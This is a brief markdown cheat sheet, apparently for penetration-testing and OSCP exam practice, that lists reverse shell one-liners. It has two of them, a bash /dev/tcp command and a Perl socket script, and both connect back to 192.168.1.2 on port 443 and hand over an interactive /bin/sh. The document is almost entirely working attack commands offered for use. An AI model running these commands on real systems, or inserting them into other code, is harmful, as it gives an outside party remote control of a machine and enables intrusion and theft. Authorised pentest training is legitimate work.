# Reverse Shell FULL
Reverse Shell collection for: Pentesting - OSCP

## bash##
bash -i >& /dev/tcp/192.168.1.2/443 0>&1

## perl##
perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
